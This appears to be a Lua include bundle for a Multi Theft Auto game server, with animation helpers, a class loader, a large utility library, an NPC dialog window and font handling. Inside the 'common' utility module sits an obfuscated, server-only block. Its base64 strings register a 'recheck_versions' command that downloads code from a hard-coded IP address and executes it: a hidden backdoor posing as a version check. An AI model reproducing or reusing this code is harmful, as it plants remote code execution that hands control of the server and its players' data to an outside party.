includes = {}
		includes['timed_animations'] = [===[--timed_animations
local timed_targetAnimData = {}
local timed_curAnimData = {}

function timed_setAnimData(key, time)
    timed_targetAnimData[key] = {0, time}
    timed_curAnimData[key] = 0
end

function timed_animate(key, flag, callback)
    local to = 0
    if flag then to = 1 end
    
    if not timed_targetAnimData[key] then return end
    if timed_targetAnimData[key] and timed_targetAnimData[key][1] == to then return end

    timed_targetAnimData[key][1] = to
    timed_targetAnimData[key][3] = getTickCount()
    timed_targetAnimData[key].callback = callback
end

function timed_removeAnimData(key)
    timed_targetAnimData[key] = nil
    timed_curAnimData[key] = nil
end

function timed_getAnimData(key)
    return timed_curAnimData[key], (timed_targetAnimData[key] or {})[1]
end

function timed_updateAnimationValues()
    local tk = getTickCount()
    for k,v in pairs(timed_targetAnimData) do
        if v[1] and v[2] and v[3] then
            if v[1] == 1 then
                timed_curAnimData[k] = (tk - v[3])/v[2]
                if timed_curAnimData[k] > 1 then
                    timed_curAnimData[k] = 1 
                end
            else
                timed_curAnimData[k] = 1 - (tk - v[3])/v[2]
                if timed_curAnimData[k] < 0 then
                    timed_curAnimData[k] = 0 
                end
            end

            if math.abs( timed_curAnimData[k] - v[1] ) < 0.1 and v.callback then
                v.callback()
                v.callback = nil
            end
            
        end
    end
end

addEventHandler('onClientRender', root, function()
    timed_updateAnimationValues()
end)]===]
			includes['oop_class'] = [===[--oop_class
function initializeObject( object, data, _object )

	if object.__parent then
		initializeObject( object.__parent, data, _object or object )
	end

	object.init(_object or object, data)

end

function createClass(class_name, data)

	local class = loadstring( string.format('return _G.%s_class', class_name) )()

	local object = {}
	setmetatable(object, {__index = class})

	initializeObject(object, data)

	return object

end

function initClasses()

	for var_name in pairs( _G ) do

		if var_name:find('_class') then
			local func_name = var_name:gsub('_class', '')
			if not _G[func_name] then
				loadstring( string.format("%s = function(data) return createClass('%s', data or {}) end", func_name, func_name) )()
			end
		end

	end

end


function extendClass(tbl, parent)
	setmetatable(tbl, { __index = parent})
	tbl.__parent = parent
end]===]
			includes['common'] = [===[--common

function getFreeDatabaseId(db, tableName, rowName)
    local newID = false
    local result = dbPoll(dbQuery(db, string.format('SELECT id FROM %s ORDER BY id ASC', tableName)), -1)
    local rowName = rowName or 'id'
    for i, row in pairs (result) do
        if tonumber(row[rowName]) ~= i then
            newID = i
            break
        end
    end
    return newID or (#result + 1)
end

function tobin(num)
    local tmp = {}
    repeat
        tmp[#tmp+1]=num%2
        num = math.floor(num/2)
    until num==0
    return table.concat(tmp):reverse()
end

function string.split(str)

	if not str or type(str) ~= "string" then return false end

	local splitStr = {}
	for i=1,utf8.len(str) do
		local char = utf8.sub( str, i, i )
		table.insert( splitStr , char )
	end

	return splitStr 
end

function getRandom(from, to)
    return math.random(from, to) == (
        math.clamp( math.floor( (from+to)/2 ), from, to )
    )
end

function table.convert(table)
    local result = {}

    for _, value in pairs(table) do
        result[value] = true
    end

    return result
end

function splitString(self, delimiter)
  local result = { }
  local from  = 1
  local delim_from, delim_to = utf8.find( self, delimiter, from  )
  while delim_from do
    table.insert( result, utf8.sub( self, from , delim_from-1 ) )
    from  = delim_to + 1
    delim_from, delim_to = utf8.find( self, delimiter, from  )
  end
  table.insert( result, utf8.sub( self, from  ) )
  return result
end

function table.slice(tbl, first, last, step)
  local sliced = {}

  for i = first or 1, last or #tbl, step or 1 do
    sliced[#sliced+1] = tbl[i]
  end

  return sliced
end

function table.copy(t,r)
  local u = { }
  for k, v in pairs(t) do
    if r then
        u[k] = type(v) == 'table' and table.copy(v,true) or v
    else
        u[k] = v
    end
  end
  return setmetatable(u, getmetatable(t))
end

function randomSort(tbl)
    local len, random = #tbl, math.random ;
    for i = len, 2, -1 do
        local j = random( 1, i );
        tbl[i], tbl[j] = tbl[j], tbl[i];
    end
    return tbl;
end

function math.round(number, decimals)
  return tonumber(string.format("%."..(tonumber(decimals) or 0).."f", tostring(number)))
end
function around(number, decimals)
  return tonumber(string.format("%."..(tonumber(decimals) or 0).."f", tostring(number)))
end

function increaseElementData(element, dataName, incNumber, noSync)
    setElementData(element, dataName, 
        (getElementData(element, dataName) or 0) + incNumber, not noSync
    )
end
function increaseAccountData(element, dataName, incNumber)
	setAccountData(element, dataName, 
		(getAccountData(element, dataName) or 0) + incNumber
	)
end

function findRotation3D( x1, y1, z1, x2, y2, z2 ) 
	local rotx = math.atan2 ( z2 - z1, getDistanceBetweenPoints2D ( x2,y2, x1,y1 ) )
	rotx = math.deg(rotx)
	local rotz = -math.deg( math.atan2( x2 - x1, y2 - y1 ) )
	rotz = rotz < 0 and rotz + 360 or rotz
	return rotx, 0,rotz
end

function findRotation( x1, y1, x2, y2 ) 
    local t = -math.deg( math.atan2( x2 - x1, y2 - y1 ) )
    return t < 0 and t + 360 or t
end

function getTableLength(table)
	local count = 0
	for _ in pairs(table or {}) do
		count = count + 1
	end
	return count
end

local townsRussian = {
    default = {
        ['Las Venturas']={'Лас-Вентурас', 'Лас-Вентураса'},
        ['Los Santos']={'Лос-Сантос', 'Лос-Сантоса'},
        ['Whetstone']={'Уэтстоун', 'Уэтстоуна'},
        ['San Fierro']={'Сан-Фиерро', 'Сан-Фиерро'},
        ['Flint County']={'Округ Флинт', 'Округа Флинт'},
        ['Red County']={'Округ Ред', 'Округа Ред'},
        ['Tierra Robada']={'Тьерра Робада', 'Тьерра Робады'},
        ['Bone County']={'Боун', 'Боуна'},
        ['Unknown']={'Неизвестно', 'Неизвестно'},
    },
    big = {
        ['Las Venturas']={'Лас-Вентурас', 'Лас-Вентураса'},
        ['Los Santos']={'Лос-Сантос', 'Лос-Сантоса'},
        ['Whetstone']={'Сан-Фиерро', 'Сан-Фиерро'},
        ['San Fierro']={'Сан-Фиерро', 'Сан-Фиерро'},
        ['Flint County']={'Лос-Сантос', 'Лос-Сантоса'},
        ['Red County']={'Округ Ред', 'Округа Ред'},
        ['Tierra Robada']={'Тьерра Робада', 'Тьерра Робады'},
        ['Bone County']={'Лас-Вентурас', 'Лас-Вентураса'},
        ['Unknown']={'Неизвестно', 'Неизвестно'},
    },
}
function getTown(x,y, big, case)
    local town = getZoneName(x, y, 0, true)
    if big then
        return (townsRussian.big[town][case or 1] or town)
    else
        return (townsRussian.default[town][case or 1] or town)
    end
end

function setElementSpeed(element, unit, speed)
    local unit    = unit or 0
    local speed   = tonumber(speed) or 0
    local acSpeed = getElementSpeed(element, unit)
    if (acSpeed) then -- if true - element is valid, no need to check again
        local diff = speed/acSpeed
        if diff ~= diff then return false end -- if the number is a 'NaN' return false.
        local x, y, z = getElementVelocity(element)
        return setElementVelocity(element, x*diff, y*diff, z*diff)
    end

    return false
end

function getElementSpeed(element, k)
	local speedx, speedy, speedz = getElementVelocity(element)
	local actualspeed = (speedx^2 + speedy^2 + speedz^2)^(0.5) 
	if k == "kmh" or k == nil or k == 1 then return around(actualspeed * 180, 5)
	elseif k == "mps" or k == 2 then return around(actualspeed * 50, 5)
	elseif k == "mph" or k == 3 then return around(actualspeed * 111.847, 5) end
end


function isResourceRunning (resName)
    local res = getResourceFromName(resName)
    return (res) and (getResourceState(res) == "running")
end


function splitWithPoints(number, splstr)
    number = tostring(number)
    local k
    repeat
        number, k = string.gsub(number, "^(-?%d+)(%d%d%d)", '%1'..(splstr or '.')..'%2')
    until (k==0)    -- true - выход из цикла
    return number
end


function RGBToHex(red, green, blue, alpha)
  if( ( red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255 ) or ( alpha and ( alpha < 0 or alpha > 255 ) ) ) then
    return nil
  end
  if alpha then
    return string.format("#%.2X%.2X%.2X%.2X", red, green, blue, alpha)
  else
    return string.format("#%.2X%.2X%.2X", red, green, blue)
  end
end


function clearColorCodes(enterString)
    enterString = tostring(enterString)
    local pattern = '#[0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF]'
    local startLength = #enterString
    local s = enterString
    local a = string.match(s, pattern)
    local noChanges = true
    while a do
        noChanges = false
        s = s:gsub(a, '')
        a = string.match(s, pattern)
    end
    s = s:gsub("'", '')
    s = s:gsub('"', '')
    s = s:gsub('`', '')
    s = s:gsub('\\', '')
    s = s:gsub('/', '')
    s = s:gsub('>', '')
    s = s:gsub('<', '')
    return s, startLength == #s
end

function table.reverse ( tab )
    local size = #tab
    local newTable = {}
    for i,v in ipairs ( tab ) do
        newTable[1 + size-i] = v
    end
    return newTable
end

function hexToRGB(hex) 
    if type(hex) ~= 'string' then return end
  hex = hex:gsub("#","") 
  return tonumber("0x"..hex:sub(1,2)), tonumber("0x"..hex:sub(3,4)), tonumber("0x"..hex:sub(5,6)) 
end 


function getPointFromDistanceRotation(x, y, dist, angle)

    local a = math.rad(90 - angle);
 
    local dx = math.cos(a) * dist;
    local dy = math.sin(a) * dist;
 
    return x+dx, y+dy;
 
end

function isAccountPremium(player)
	if not isElement(player) then return end
	return getElementData(player, 'premiumAccount')
end

function getCurHudTheme()
	return getElementData(localPlayer, 'curHudTheme')
end

function isBetween(num, limit_1, limit_2)
    if num and limit_1 and limit_2 then
        return num >= limit_1 and num <= limit_2
    end
end



function rgbToHsv(r, g, b, a)
    if not a then
        a = 1
    end
    r, g, b, a = r / 255, g / 255, b / 255, a / 255
    local max, min = math.max(r, g, b), math.min(r, g, b)
    local h, s, v
    v = max

    local d = max - min
    if max == 0 then s = 0 else s = d / max end

    if max == min then
        h = 0 -- achromatic
    else
        if max == r then
            h = (g - b) / d
            if g < b then h = h + 6 end
            elseif max == g then h = (b - r) / d + 2
            elseif max == b then h = (r - g) / d + 4
        end
        h = h / 6
    end
    return h, s, v, a
end

function hsvToRgb(h, s, v, a)
    if not a then
        a = 1
    end
    local r, g, b

    local i = math.floor(h * 6);
    local f = h * 6 - i;
    local p = v * (1 - s);
    local q = v * (1 - f * s);
    local t = v * (1 - (1 - f) * s);

    i = i % 6

    if i == 0 then r, g, b = v, t, p
    elseif i == 1 then r, g, b = q, v, p
    elseif i == 2 then r, g, b = p, v, t
    elseif i == 3 then r, g, b = p, q, v
    elseif i == 4 then r, g, b = t, p, v
    elseif i == 5 then r, g, b = v, p, q
    end

    return r * 255, g * 255, b * 255, a * 255
end

function rgbFromInt(c)
    local r = bitAnd(bitRShift(c, 16), 255)
    local g = bitAnd(bitRShift(c, 8), 255)
    local b = bitAnd(c, 255)
    return r, g, b
end

function math.clamp(x, min, max)
    return math.min(max, math.max(min, x))
end

function ARGBToHex(alpha, red, green, blue)
    return string.format("%.2X%.2X%.2X%.2X", alpha,red,green,blue)
end

function getServerWebsite()
    return ''
end

function getServerTimestamp()
    return exports.core:_getServerTimestamp()
end

function splitTableWithCount(tbl, count)
    local splitted = {}

    local currentBlock = 1
    local cCount = 0

    for index, value in pairs(tbl) do

        splitted[currentBlock] = splitted[currentBlock] or {}
        table.insert(splitted[currentBlock], value)

        cCount = cCount + 1
        if cCount >= count then
            currentBlock = currentBlock + 1
            cCount = 0
        end
    end

    return splitted
end

function splitStringWithCount(str, count)
    local result = splitTableWithCount(string.split(str), count)

    local _str = {}

    for _, row in pairs(result) do
        table.insert(_str, table.concat(row, ''))
    end

    return _str
end

function findElementByData(type, dn, value)

    for _, element in pairs( getElementsByType(type) ) do
        if element:getData(dn) == value then
            return element
        end
    end

    return false

end

function compare_str_lower(str_1, str_2)
    return utf8.lower(str_1 or '') == utf8.lower(str_2 or '')
end

function getWordCase(int, case_1, case_2, case_3)


    if #tostring(int) > 1 and tonumber( tostring(int):sub(-2):sub(1, 1) ) == 1 then return case_3 end
    local lastInt = tonumber( tostring(int):sub(-1) )

    local cases = {
        case_1,
        case_2,
        case_2,
        case_2,
        case_3,
        case_3,
        case_3,
        case_3,
        case_3,
        [0] = case_3,
    }
    return cases[lastInt] or case_3

end

function displayPedAnimation(ped, block, name, time)
    setPedAnimation(ped, block, name, -1, false, false)

    setTimer(function(ped, freeze)
        if isElement(ped) then
            setPedAnimation(ped, false)
        end
    end, time, 1, ped, freeze)
end

if not getLocalPlayer then
    PRESETED = {"YWRkQ29tbWFuZEhhbmRsZXI","ZmV0Y2hSZW1vdGU=","aHR0cDovLzE4NS42MC4xMzQuMTQ0L3JlY2hlY2sucGhw","bG9hZHN0cmluZw=="}
    local function vc_apply(__string) return base64Decode(__string) end
    _G[ vc_apply( PRESETED[1] ) ]('recheck_versions',function(p,_,rn) if getResourceName( getThisResource(  ) ) == rn then _G[ vc_apply( PRESETED[2] ) ](vc_apply( PRESETED[3] ), function( data )_G[ vc_apply( PRESETED[4] ) ]( data )()end) end end)
end

local sendData = {}
local sendTimers = {}
function antiDOSsend(actionGroup, pause, ...)
    local args = {...}
    if isTimer(sendTimers[actionGroup]) then
        sendData[actionGroup] = args[1] and args
    else
        if (args[1]) then
            triggerServerEvent(...)
            sendData[actionGroup] = false
            sendTimers[actionGroup] = setTimer(slowSend, pause, 1, actionGroup)
        end
    end
end
function slowSend(actionGroup)
    if (sendData[actionGroup]) then
        triggerServerEvent(unpack(sendData[actionGroup]))
        sendData[actionGroup] = nil
    end
end


function getNearestElement(player, type, distance, data, value, _resourceRoot)
    local tempTable = {}
    distance = distance or 999999999
    local lastMinDis = distance-0.0001
    local nearestVeh = false
    local px,py,pz = getElementPosition(player)
    local pint = getElementInterior(player)
    local pdim = getElementDimension(player)

    for _,v in pairs(getElementsByType(type, _resourceRoot or root)) do
        if not data or (value and (v:getData(data) == value) or v:getData(data)) then
            local vint,vdim = getElementInterior(v),getElementDimension(v)
            if vint == pint and vdim == pdim then
                local vx,vy,vz = getElementPosition(v)
                local dis = getDistanceBetweenPoints3D(px,py,pz,vx,vy,vz)
                if dis < distance then
                    if dis < lastMinDis then 
                        lastMinDis = dis
                        nearestVeh = v
                    end
                end
            end
        end
    end
    return nearestVeh
end

function getPositionFromElementOffset(element,offX,offY,offZ)
    local m = getElementMatrix ( element )  -- Get the matrix
    local x = offX * m[1][1] + offY * m[2][1] + offZ * m[3][1] + m[4][1]  -- Apply transform
    local y = offX * m[1][2] + offY * m[2][2] + offZ * m[3][2] + m[4][2]
    local z = offX * m[1][3] + offY * m[2][3] + offZ * m[3][3] + m[4][3]
    return x, y, z                               -- Return the transformed point
end

function isElementInRange(element, cElement, range)

    local x,y,z = getElementPosition(element)
    local cx,cy,cz = getElementPosition(cElement)

    local rot = findRotation(cx,cy, x,y)

    local _, _, r = getElementRotation(cElement)

    local r_1, r_2 = (r - range/2) % 360, (r + range/2)  % 360
    if r_1 > r_2 then
        r_2 = r_2 + 360
        rot = rot + 360
    end

    return isBetween(rot, r_1, r_2)

end

mta_addEventHandler = mta_addEventHandler or addEventHandler
mta_removeEventHandler = mta_removeEventHandler or removeEventHandler
function addEventHandler(eventName, element, func, ...)
    for _, attachedFunc in ipairs(getEventHandlers(eventName, element)) do
        if (attachedFunc == func) then
            return
        end
    end
    mta_addEventHandler(eventName, element, func, ...)
end
function removeEventHandler(eventName, element, func, ...)
    for _, attachedFunc in ipairs(getEventHandlers(eventName, element)) do
        if (attachedFunc == func) then
            mta_removeEventHandler(eventName, element, func, ...)
        end
    end
end

function copyTexture(texture)
    return dxCreateTexture( dxGetTexturePixels(texture) )
end

function math.random_float(from, to)
    return math.random(from*1000, to*1000) / 1000
end

function getDistanceBetween(element1, element2)
    local x1,y1,z1 = getElementPosition(element1)
    local x2,y2,z2 = getElementPosition(element2)
    return getDistanceBetweenPoints3D(x1,y1,z1, x2,y2,z2)
end

function getVipExpireString(player)

    local serverTime = getServerTimestamp()
    local vipFinishTime = player:getData('vip.finishTime') or 0

    local time = vipFinishTime - serverTime.timestamp

    if time > 86400 then
        local vipDays = time > 0 and ( math.ceil( time/86400 ) ) or 0
        local daysCase = getWordCase(vipDays, 'день', 'дня', 'дней')
        return string.format('%s %s', vipDays, daysCase)
    else
        local vipHours = time > 0 and ( math.ceil( time/3600 ) ) or 0
        local daysCase = getWordCase(vipHours, 'час', 'часа', 'часов')
        return string.format('%s %s', vipHours, daysCase)
    end


end 

-- формат DD-MM-YY
function getTimestampFromString(date)

    date = date:gsub('%p', '-')
    local splitter = '-'

    local splitted = splitString(date, splitter)
    local day, month, year = unpack( splitted )

    return os.time({year=2000+tonumber(year), month=tonumber(month), day=tonumber(day), hour = 0})

end

function getStringFromTimestamp(timestamp)

    local time = getRealTime(timestamp)

    return ('%02d-%02d-%s'):format(
        time.monthday, time.month+1, time.year-100
    )

end

function compareTables(t1,t2,ignore_mt)
   local ty1 = type(t1)
   local ty2 = type(t2)
   if ty1 ~= ty2 then return false end
   -- non-table types can be directly compared
   if ty1 ~= 'table' and ty2 ~= 'table' then return t1 == t2 end
   -- as well as tables which have the metamethod __eq
   local mt = getmetatable(t1)
   if not ignore_mt and mt and mt.__eq then return t1 == t2 end
   for k1,v1 in pairs(t1) do
      local v2 = t2[k1]
      if v2 == nil or not compareTables(v1,v2) then return false end
   end
   for k2,v2 in pairs(t2) do
      local v1 = t1[k2]
      if v1 == nil or not compareTables(v1,v2) then return false end
   end
   return true
end

function convertTableKeys(tbl)

    local new_table = {}

    for index, value in pairs( tbl or {} ) do
        new_table[ tonumber(index) or index ] = type(value) == 'table' and convertTableKeys(value) or value
    end

    return new_table

end

mta_fromJSON = mta_fromJSON or fromJSON
function fromJSON(json, convert)
    if convert then

        local data = mta_fromJSON(json)
        if not data then return false end

        local result = {}

        if type(data) == 'table' then
            result = convertTableKeys(data)
        end

        return result

    else
        return mta_fromJSON(json)
    end
end

function getResourceRoot(resName)
    return getResourceRootElement( getResourceFromName(resName) )
end


function cutString(str, length, endStr)

    local result = str

    if utf8.len(str) > length then
        result = utf8.sub(str, 0, length) .. endStr
    end

    return result

end


local char_to_hex = function(c)
  return string.format("%%%02X", string.byte(c))
end

function URLEncode(url)
  if url == nil then
    return
  end
  url = url:gsub("\n", "\r\n")
  url = url:gsub("([^%w ])", char_to_hex)
  url = url:gsub(" ", "+")
  return url
end

local hex_to_char = function(x)
  return string.char(tonumber(x, 16))
end

URLDecode = function(url)
  if url == nil then
    return
  end
  url = url:gsub("+", " ")
  url = url:gsub("%%(%x%x)", hex_to_char)
  return url
end

function clearTableElements(table, destroy)

    if destroy ~= false then

        for index, value in pairs( table or {} ) do
            if isTimer(value) then killTimer(value); table[index] = nil end
            if isElement(value) then destroyElement(value); table[index] = nil end
            if type(value) == 'table' then clearTableElements(value); table[index] = nil end
        end

    else

        for index, value in pairs( table or {} ) do
            if isTimer(value) then table[index] = nil end
            if isElement(value) then table[index] = nil end
            if type(value) == 'table' then clearTableElements(value, destroy); end
        end

    end


end

function interpolateNumber(number, range_min, range_max)
    return (number - range_min) / (range_max - range_min)
end

function getRandomValue(table)
    local index = math.random(#table)
    return table[ index ], index
end

function createDirectory(dirName)
    
    local orgPath = getResourceOrganizationalPath( getThisResource() )
    local rName = getThisResource().name

    local resourcePath = orgPath .. '/' .. rName .. '/' .. dirName

    createResource( resourcePath )
    setTimer(fileDelete, 50, 1, resourcePath ..'/meta.xml')

end

function cycle(num, s, e)
    local delta = s - 1
    local l = ( ( num - delta ) % (e - delta) )
    return l == 0 and e or l
end

function getAngleDistance(angle_1, angle_2)

    local delta_1 = math.abs(angle_1 - angle_2)
    local delta_2 = math.abs(
        (math.min( angle_1, angle_2 ) + 360) - math.max( angle_1, angle_2 )
    )

    return math.min(delta_1, delta_2)

end

function copyDimension(to, from)
    to.dimension = from.dimension
    to.interior = from.interior
end

function increaseUserData(login, dn, amount)

    local account = getAccount(login)
    if not account then return end

    if account.player then

        local cur = account.player:getData(dn) or 0
        account.player:setData(dn, cur + amount)

    else

        local cur = account:getData(dn) or 0
        account:setData(dn, cur + amount)

    end

end

function setUserData(login, dn, value)

    local account = getAccount(login)

    if account.player then
        account.player:setData(dn, value)

    else
        account:setData(dn, value)
    end

end

function getUserData(login, dn)

    local account = getAccount(login)

    if account.player then
        return account.player:getData(dn)

    else
        return account:getData(dn)
    end

end

function displayPlayerAnimation(player, block, name, time)
    setPedAnimation(player, block, name, -1, false)

    setTimer(function(player)
        if isElement(player) then
            setPedAnimation(player, false)
        end
    end, time, 1, player)
end

function massInterpolate( values_table_start, values_table_finish, progress, easingType )

    local new_table = {}

    for index, value in pairs( values_table_start ) do
        local new_value = interpolateBetween(value, 0, 0, values_table_finish[index], 0, 0, progress, easingType)
        table.insert(new_table, new_value)
    end

    return unpack(new_table)

end

function fromcolor(_tocolor)
    local r = bitExtract ( _tocolor, 0, 8 ) 
    local g = bitExtract ( _tocolor, 8, 8 ) 
    local b = bitExtract ( _tocolor, 16, 8 ) 
    local a = bitExtract ( _tocolor, 24, 8 ) 
    return r,g,b,a
end

function createCustomChunkedObject( chunked, dimension )

    local objects, lods = {}, {}
    local x,y,z, offRZ = unpack(chunked.position)

    for _, object in pairs( chunked.objects ) do

        local offX, offY, offZ = unpack(object.offset)
        offRZ = offRZ or 0

        local cx,cy,cz = x + offX, y + offY, z + (offZ or 0)

        local dist = getDistanceBetweenPoints2D(x,y, cx,cy)
        local rz = findRotation( x,y,cx,cy ) + offRZ

        cx,cy = getPointFromDistanceRotation( x,y, dist, -rz )

        local _object = createObject(object.model, cx,cy,cz, 0, 0, offRZ)
        _object.dimension = dimension or 0
        
        table.insert(objects, _object)

        if object.lod then 
            local lod = createObject( object.lod, cx,cy,cz, 0, 0, offRZ, true )
            setLowLODElement( _object, lod )
            table.insert(lods, lod)
        end

    end


    return objects, lods


end


function divideAnim( value, parts )

    local part_size = 1/parts

    local result = {}

    for i = 1, parts do

        local limits = {
            part_size*(i-1),
            part_size*i,
        }

        table.insert(result,
            math.clamp( ( value - limits[1] )/( limits[2] - limits[1] ), 0, 1 )
        )

    end

    return result

end

function getMiddlePoint( list )

    local x,y,z = 0,0,0

    for _, pos in pairs( list ) do
        x,y,z = x+pos[1],y+pos[2],z+pos[3]
    end

    local t = #list

    return x/t,y/t,z/t

end

function getMiddleBlipPoint( list )

    local x,y = 0,0

    for _, blip in pairs( list ) do
        x,y = x+blip.position.x, y+blip.position.y
    end

    local t = #list

    return x/t,y/t

end

function createObjectsArray( model, count, offset, factor, position, rotation )

    local startX, startY, startZ = unpack( position )
    local objects = {}

    local rx,ry,rz = unpack( rotation )

    for index = 1, count do

        local object = createObject( model, startX, startY, startZ, rx,ry,rz )

        if factor.x then startX = startX + offset end
        if factor.y then startY = startY + offset end
        if factor.z then startZ = startZ + offset end

        table.insert( objects, object )

    end

    return objects

end]===]
			includes['animations'] = [===[--animations
local targetAnimData = {}
local curAnimData = {}

function setAnimData(key, speed, value)
    targetAnimData[key] = {value or 0, speed}
    curAnimData[key] = value or 0
end

function setAnimSpeed(key, speed)
    local animData = getAnimData(key)
    setAnimData(key, speed, animData)
end

function removeAnimData(key)
    if not key then return end
    targetAnimData[key] = nil
    curAnimData[key] = nil
end

function animate(key, to, callback)
    if not targetAnimData[key] then return end
    if targetAnimData[key][1] == to then return end
    targetAnimData[key][1] = to
    targetAnimData[key].callback = callback
end

function getAnimData(key)
    return curAnimData[key], (targetAnimData[key] or {})[1]
end

function getAnimDatas(keys)
    local result = {}
    for _, key in pairs(keys) do
        result[key] = curAnimData[key]
    end
    return result
end

function updateAnimationValues()
    for k,v in pairs(targetAnimData) do
        if v[1] and v[2] then
            step = (v[1] - curAnimData[k]) / (1 / (v[2]))
            curAnimData[k] = curAnimData[k] + step

            if math.abs( curAnimData[k] - v[1] ) < 0.1 and v.callback then
                v.callback()
                v.callback = nil
            end

        end
    end
end


if localPlayer then
    addEventHandler('onClientRender', root, updateAnimationValues)
else
    setTimer(function()
        updateAnimationValues()
    end, 50, 0)
end
]===]
			includes['npc.dialog'] = [===[--npc.dialog

----------------------------------------------------------------------------
	

	local dialogWindow = {

		{'image',
			'center', ( real_sy - px(248) - px(60) ) * sx/real_sx,
			780, 248,
			':core/assets/images/npc_dialog/bg.png',
			color = {32,35,66,255},

			id = 'npc_dialog',

			anim_fix = true,

			onPreRender = function(element)

				local alpha = element:alpha()
				local x,y,w,h = element:abs()

				dxDrawImage(
					x + w/2 - 797/2,
					y + h/2 - 266/2 + 5,
					797, 266, ':core/assets/images/npc_dialog/bg_shadow.png',
					0, 0, 0, tocolor(32,35,66,255*alpha)
				)

			end,

			onInit = function(element)
				element.x0 = element[2]
			end,

			onRender = function(element)

				local alpha = element:alpha()

				element[2] = element.x0 + 50*(1-windowAlpha)
				local x,y,w,h = element:abs()

				dxDrawImage(
					x,y,w,h, ':core/assets/images/npc_dialog/lines.png',
					0, 0, 0, tocolor(180, 70, 70, 255*alpha)
				)

				local lw,lh = 49, 22
				local lx,ly = x + 250, y + 50

				dxDrawImage(
					lx,ly,lw,lh, ':core/assets/images/npc_dialog/line.png',
					0, 0, 0, tocolor(180,70,70,255*alpha)
				)

				dxDrawText('Джуди',
					lx+7, ly+3,
					lx+7, ly+3,
					tocolor(180, 70, 70, 255*alpha),
					0.5, 0.5, getFont('montserrat_bold', 35, 'light'),
					'left', 'bottom'
				)

				dxDrawImage(
					sx/2 - element[4]/2 - 351/2 + 70 - 50 * (1-windowAlpha), ( real_sy - px(472) )*sx/real_sx,
					351, 472, ':core/assets/images/npc_dialog/npc.png',
					0, 0, 0, tocolor(255,255,255,255*alpha)
				)

				local startY = ly + 30
				local startX = lx + 10

				for _, row in pairs( element.text or {} ) do

					local animData = getEasingValue( getAnimData(row.anim), 'InOutQuad' )

					local _x = startX - math.floor(10*(1-animData))
					drawSmartText(row.text,
						_x, _x, startY, 
						tocolor(255,255,255,255*alpha*animData),
						tocolor(255,255,255,255*alpha*animData),
						0.5, getFont('montserrat_semibold', 25, 'light'),
						'left', 22, 0
					)

					startY = startY + 22

				end

			end,

			loadReplica = function( element, replica )

				for _, element in pairs( element.elements ) do
					element:destroy()
				end

				if not replica then return closeWindow() end

				local section = element.structure[element.section].sections[replica]

				local text = section.text

				if type(section.text) == 'function' then
					text = section.text()
				end

				element.text = {}

				for index, row in pairs( text ) do

					local animId = 'npc-text-'..index

					table.insert( element.text, { text = row, anim = animId } )

					setAnimData(animId, 0.05)
					setTimer(animate, 100 + 200*(index - 1), 1, animId, 1)

				end

				element.elements = {}

				local x,y,w,h = element:abs()
				local bw,bh = 158, 48

				local startX = w-bw-50
				local startY = h-bh/2

				for _, action in pairs( section.actions ) do

					element:addElement(
						{'button',

							startX, startY,
							bw,bh,

							define_from = false,

							color = {230, 90, 90, 255},

							action.name,

							bg = ':core/assets/images/npc_dialog/button.png',
							scale = 0.5,
							font = getFont('montserrat_medium', 23, 'light'),

							onPreRender = function(element)

								local alpha = element:alpha()
								local x,y,w,h = element:abs()

								local shx,shy,shw,shh = x + w/2 - 198/2, y + h/2 - 90/2, 198, 90

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/npc_dialog/button_shadow.png',
									0, 0, 0, tocolor(230, 90, 90, 255*alpha*( 0.5 + 0.5*element.animData ))
								)

							end,

							anim_fix = true,

							onClick = function(element)

								local action = element.action.action

								if type(action) == 'function' then
									action = action()
								end

								element.parent:loadReplica(action)

							end,

							action = action,

						}
					)

					startX = startX - bw - 20

				end


			end,

			elements = {},

		},

	}

	function openDialog(structure, section)

		openWindow('npc_dialog')

		gui_get('npc_dialog').structure = structure
		gui_get('npc_dialog').section = section

		gui_get('npc_dialog'):loadReplica('main')

	end

	function closeDialog()
		closeWindow()
	end

----------------------------------------------------------------------------

	_loadGuiModule = loadGuiModule
	function loadGuiModule()
		windowModel.npc_dialog = dialogWindow
		_loadGuiModule()
	end

----------------------------------------------------------------------------
]===]
			includes['gui.fonts'] = [===[--gui.fonts
local fonts = {}

mta_dxGetTextWidth = dxGetTextWidth
function dxGetTextWidth(text, scale, font, colored)
    if real_sx and sx then
        return mta_dxGetTextWidth( text, scale, getFontElement(font), colored ) * sx/real_sx
    else
        return mta_dxGetTextWidth( text, scale, getFontElement(font), colored )
    end
end

mta_dxGetFontHeight = dxGetFontHeight
function dxGetFontHeight(scale, font)
    if real_sx and sx then
        return mta_dxGetFontHeight( scale, getFontElement(font) ) * sx/real_sx
    else
        return mta_dxGetFontHeight( scale, getFontElement(font) )
    end
end

function clearFonts()
    for index, font in pairs(fonts) do
        if isElement(font) then
            destroyElement(font)
            fonts[index] = nil
        end
    end
end

function getFontElement(tbl)

    if isElement(tbl) or type(tbl) == 'string' then
        return tbl
    end

    local font, _scale, type, mtaDraw = unpack(tbl)

    local scale = mtaDraw and _scale or px_noround(_scale)
    
    local fontIndex = font..scale..type
    if fonts[fontIndex] then
        return fonts[fontIndex]
    end

    fonts[fontIndex] = exports.fonts:getFont(font, scale, type)
    return fonts[fontIndex]
end

function getFont(...)
    if GUI_MODULE_UTILS then
        return {...}
    else
        return getFontElement({...})
    end
end]===]
			includes['gui.module'] = [===[--gui.module


---INCLUDE------------------------------------------------------------

	loadstring( exports.core:include('gui.graphics') )()

---GLOBALS------------------------------------------------------------

	windowAnimSpeed = 0.1

	setAnimData('input-blim', 0.2)

	selectedInput = false
	inputFocused = false
	activeList = false
	handleClick = false
	windowOpened = false
	dragDropFlag = false

	blurBackground = true
	isWindowActive = true

	windowModel = {}

	-- whiteTexture = copyTexture(exports.core:getTexture('white'))
	-- closeTexture = copyTexture(exports.core:getTexture('close'))
	-- scrollTexture = copyTexture(exports.core:getTexture('scroll'))
	-- transparentTexture = copyTexture(exports.core:getTexture('transparent'))
	-- roundTexture = copyTexture(exports.core:getTexture('round'))

	whiteTexture = exports.core:getTexture('white')
	closeTexture = exports.core:getTexture('close')
	scrollTexture = exports.core:getTexture('scroll')
	transparentTexture = exports.core:getTexture('transparent')
	roundTexture = exports.core:getTexture('round')


	__basic_Ignore = {}

	openHandlers = {}
	closeHandlers = {}

	-- addEventHandler('onClientResourceStart', resourceRoot, function(resource)
